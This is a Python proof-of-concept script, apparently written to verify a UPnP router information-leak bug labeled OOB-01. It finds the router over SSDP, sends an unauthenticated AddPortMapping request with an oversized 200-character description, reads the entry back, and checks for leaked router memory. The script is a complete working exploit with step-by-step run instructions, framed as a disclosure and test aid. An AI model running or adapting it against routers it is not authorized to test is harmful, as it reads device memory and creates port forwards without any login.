#!/usr/bin/env python3
"""
OOB-01 real-router test script (no extra libraries needed, just Python 3).

WHAT THIS DOES, IN PLAIN WORDS
  UPnP (the feature that lets apps like games/torrent clients auto-open
  router ports) has NO login of any kind -- that's part of the UPnP
  standard, not a bug in this router specifically. This script:
    1. asks the network "who is a UPnP router here?" (this is called
       SSDP discovery -- completely normal, any device can do this)
    2. tells the router "please forward port 55123 to me, and by the
       way here's a description for this forwarding rule" -- but makes
       the description way longer than the router's own internal buffer
       for it (this is the AddPortMapping step)
    3. asks the router "tell me about the forwarding rule on port 55123"
       (this is the GetSpecificPortMappingEntry step)
    4. prints the router's answer -- if the bug is present, the answer
       will contain extra text that was never supposed to be in that
       field, because the router's own memory leaked into the answer.

WHO CAN RUN THIS
  Anyone on the same Wi-Fi/LAN as the router. No admin password, no
  router login, nothing special -- that IS the point being demonstrated.

WHAT IT DOES TO YOUR ROUTER
  It adds ONE harmless port-forwarding rule (port 55123 -> this PC,
  protocol TCP) to your router's UPnP port list. It does NOT touch your
  router's settings, Wi-Fi, admin password, or anything else. See
  "CLEANING UP AFTERWARDS" at the bottom of this file for how to remove
  the test rule when you're done (most routers also auto-expire UPnP
  rules on their own after a while, or when you reboot).

HOW TO RUN IT
  1. Connect your PC to the SAME network as the router (Wi-Fi or a LAN
     cable -- NOT a guest network, NOT a VPN).
  2. Open a terminal (Command Prompt / PowerShell on Windows, Terminal
     on Mac/Linux).
  3. Run:  python3 oob01_real_router_test.py
     (On Windows it might be "python" instead of "python3".)
  4. Read the output. The script explains what each part of the output
     means as it goes.
"""
import socket
import re
import sys
import time

DISCOVER_TIMEOUT = 3
MY_TEST_PORT = 55123          # arbitrary port number used only for this test
LONG_DESCRIPTION = "A" * 200  # longer than the router's internal buffers


def discover_router():
    """Step 1: SSDP discovery -- find the router's UPnP control address."""
    print("[1/4] Looking for a UPnP router on this network (SSDP discovery)...")
    msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        'MAN: "ssdp:discover"\r\n'
        "MX: 2\r\n"
        "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n"
        "\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(DISCOVER_TIMEOUT)
    sock.sendto(msg, ("239.255.255.250", 1900))

    deadline = time.time() + DISCOVER_TIMEOUT
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            break
        text = data.decode(errors="replace")
        m = re.search(r"LOCATION:\s*http://([\d.]+):(\d+)/", text, re.I)
        if m:
            ip, port = m.group(1), int(m.group(2))
            print(f"    Found a router replying from {addr[0]}")
            print(f"    Its UPnP control port is {port} (this is NOT the")
            print(f"    normal web-admin port -- UPnP always uses its own")
            print(f"    separate port, chosen by the router at startup).")
            return ip, port
    print("    No UPnP router answered. Possible reasons:")
    print("    - UPnP is turned off in the router's settings")
    print("    - you're on a different network/VLAN than the router")
    print("    - a firewall on this PC is blocking the reply")
    return None, None


def soap_request(ip, port, soap_action, body):
    """Send one SOAP request to the router's /ctl/IPConn endpoint and
    return the raw HTTP response text. Uses only Python's built-in
    socket module -- no extra libraries needed."""
    envelope = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        "<s:Body>" + body + "</s:Body></s:Envelope>"
    )
    req = (
        f"POST /ctl/IPConn HTTP/1.1\r\n"
        f"Host: {ip}:{port}\r\n"
        f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
        f"Content-Length: {len(envelope)}\r\n"
        f'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#{soap_action}"\r\n'
        f"Connection: close\r\n"
        f"\r\n{envelope}"
    )
    with socket.create_connection((ip, port), timeout=5) as s:
        s.sendall(req.encode())
        chunks = []
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks).decode(errors="replace")


def add_port_mapping(ip, port):
    print("\n[2/4] Sending AddPortMapping with an oversized description...")
    print(f"    Description length: {len(LONG_DESCRIPTION)} characters")
    print("    (the router's own internal buffer for this field is only")
    print("    40 or 64 bytes depending on which command reads it back)")
    body = (
        "<u:AddPortMapping "
        'xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">'
        "<NewRemoteHost></NewRemoteHost>"
        f"<NewExternalPort>{MY_TEST_PORT}</NewExternalPort>"
        "<NewProtocol>TCP</NewProtocol>"
        f"<NewInternalPort>{MY_TEST_PORT}</NewInternalPort>"
        f"<NewInternalClient>{socket.gethostbyname(socket.gethostname())}</NewInternalClient>"
        "<NewEnabled>1</NewEnabled>"
        f"<NewPortMappingDescription>{LONG_DESCRIPTION}</NewPortMappingDescription>"
        "<NewLeaseDuration>120</NewLeaseDuration>"
        "</u:AddPortMapping>"
    )
    resp = soap_request(ip, port, "AddPortMapping", body)
    print("    Router's reply (first line):", resp.splitlines()[0] if resp else "(no reply)")
    if "AddPortMappingResponse" in resp:
        print("    -> Success: the router accepted the mapping (and the")
        print("       oversized description) with no login at all.")
    elif "Conflict" in resp or "secure" in resp.lower():
        print("    -> The router's 'secure_mode' check rejected this because")
        print("       NewInternalClient didn't match this PC's own real IP")
        print("       address well enough. Re-run the script (it re-detects")
        print("       your IP each time) or check your network setup.")
    else:
        print("    -> Unexpected reply, see full text below:")
        print(resp)
    return resp


def get_specific_port_mapping_entry(ip, port):
    print("\n[3/4] Sending GetSpecificPortMappingEntry to read it back...")
    body = (
        "<u:GetSpecificPortMappingEntry "
        'xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">'
        "<NewRemoteHost></NewRemoteHost>"
        f"<NewExternalPort>{MY_TEST_PORT}</NewExternalPort>"
        "<NewProtocol>TCP</NewProtocol>"
        "</u:GetSpecificPortMappingEntry>"
    )
    return soap_request(ip, port, "GetSpecificPortMappingEntry", body)


def analyze(resp):
    print("\n[4/4] Checking the router's answer for leaked memory...")
    m = re.search(
        r"<NewPortMappingDescription>(.*?)</NewPortMappingDescription>",
        resp, re.S,
    )
    if not m:
        print("    Could not find a NewPortMappingDescription field in the")
        print("    reply -- something earlier may have failed. Full reply:")
        print(resp)
        return
    value = m.group(1)
    print(f"    The description field in the router's answer is")
    print(f"    {len(value)} characters long:")
    print()
    print("    " + value)
    print()
    a_count = len(value) - len(value.replace("A", ""))
    if len(value) > 64 or (a_count < len(LONG_DESCRIPTION) and a_count > 0 and len(value) > a_count):
        print("    *** This is LONGER than the 40/64-byte buffer the router")
        print("    *** uses internally, and/or it contains characters that")
        print("    *** are NOT the 'A' characters we sent. That extra data")
        print("    *** came from the router's own memory, not from what we")
        print("    *** sent -- this is the information leak (OOB-01).")
    elif len(value) == len(LONG_DESCRIPTION) and set(value) == {"A"}:
        print("    This matches exactly what we sent (200 'A's, nothing")
        print("    extra). On THIS specific request/router build, either")
        print("    the field wasn't truncated the way the Get* handlers")
        print("    truncate it, or you're looking at a path/field that")
        print("    doesn't hit the vulnerable 40/64-byte copy. Try the")
        print("    GetGenericPortMappingEntry / GetListOfPortMappings")
        print("    variants too (see the full guide) before concluding")
        print("    the bug isn't present on this unit.")
    else:
        print("    Inconclusive from this one field alone -- compare the")
        print("    exact bytes against what was sent (200 'A's) by eye.")


def main():
    ip, port = discover_router()
    if ip is None:
        sys.exit(1)
    add_port_mapping(ip, port)
    resp = get_specific_port_mapping_entry(ip, port)
    analyze(resp)
    print("\nDone. See 'CLEANING UP AFTERWARDS' in this file's header comment")
    print("for how to remove the test port-mapping rule from your router.")


if __name__ == "__main__":
    main()

# CLEANING UP AFTERWARDS
# -----------------------
# Open your router's own admin web page (the normal login page, e.g.
# http://192.168.0.1/), find the UPnP / port-forwarding status list, and
# delete the entry for port 55123 if it's still there. Most routers also
# remove UPnP entries automatically after the lease time expires (120
# seconds in this script) or after a reboot, so this is optional cleanup,
# not a safety requirement.
